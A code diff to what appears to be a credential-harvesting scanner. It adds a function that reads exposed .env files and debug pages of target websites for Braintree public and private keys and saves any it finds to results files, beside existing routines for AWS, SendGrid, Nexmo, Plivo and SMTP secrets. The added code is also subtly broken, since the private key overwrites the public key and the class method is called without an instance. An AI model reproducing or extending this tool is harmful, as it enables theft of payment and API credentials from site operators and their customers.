@@ -270,6 +270,52 @@ class easy:
 		except:
 		 pass
 	
+	def get_braintree(self, text, url):
+		try:
+			if "BRAINTREE" in text:
+				if "BRAINTREE_PUBLIC_KEY=" in text:
+					method = '/.env'
+					try:
+					 acc_sid = reg('\BRAINTREE_PUBLIC_KEY=(.*?)\n', text)[0]
+					except:
+					    acc_sid = ''
+				elif '<td>BRAINTREE_PUBLIC_KEY</td>' in text:
+					method = 'debug'
+					try:
+					 acc_sid = reg('<td>BRAINTREE_PUBLIC_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+					    acc_sid = ''
+				if "BRAINTREE_PRIVATE_KEY=" in text:
+					method = '/.env'
+					try:
+					 acc_sid = reg('\BRAINTREE_PRIVATE_KEY=(.*?)\n', text)[0]
+					except:
+					    acc_sid = ''
+				elif '<td>BRAINTREE_PRIVATE_KEY</td>' in text:
+					method = 'debug'
+					try:
+					 acc_sid = reg('<td>BRAINTREE_PRIVATE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+					    acc_sid = ''
+				if acc_sid == "null" or acc_sid == "" or "*" in acc_sid:
+					return False
+				else:
+				 build = 'URL: '+str(url)+'\nMETHOD: '+str(method)
+				 remover = str(build).replace('\r', '')
+				 save = open('Results/URL/url-braintree.txt', 'a')
+				 save.write(remover+'\n\n')
+				 save.close()
+				 sendgr = str(acc_sid)
+				 rever = str(sendgr).replace('\r', '')
+				 se = open('Results/braintree.txt', 'a')
+				 se.write(rever+'\n')
+				 se.close()
+				 return True
+			else:
+			  return False
+		except:
+		 pass
+	
 	def get_nexmo(self, text, url):
 		try:
 			if "NEXMO" in text:	 
@@ -688,7 +734,8 @@ def main(ujl):
 			getaws = easy().get_awskey(resp, ujl)
 			getsendg = easy().get_sendg(resp, ujl)
 			getsendinblue = easy().get_sendinblue(resp, ujl)
-			get_appkey = easy().get_appkey(resp, ujl)
+			getappkey = easy().get_appkey(resp, ujl)
+			getbraintree = easy.get_braintree(resp, ujl)
 			if getsmtp:
 				text += ' | \033[32;1mSMTP\033[0m'
 			else:
@@ -697,6 +744,10 @@ def main(ujl):
 				text += ' | \033[32;1mPLIVO\033[0m'
 			else:
 				text += ' | \033[31;1mPLIVO\033[0m'
+			if getbraintree:
+				text += ' | \033[32;1mBRAINTREE\033[0m'
+			else:
+				text += ' | \033[31;1mBRAINTREE\033[0m'
 			if getnexmo:
 				text += ' | \033[32;1mNEXMO\033[0m'
 			else:
@@ -717,7 +768,7 @@ def main(ujl):
 			 text += ' | \033[32;1mSENDINBLUE\033[0m'
 			else:
 				text += ' | \033[31;1mSENDINBLUE\033[0m'
-			if get_appkey:
+			if getappkey:
 				text += ' | \033[32;1mget_appkey\033[0m'
 			else:
 				text += ' | \033[31;1mget_appkey\033[0m'
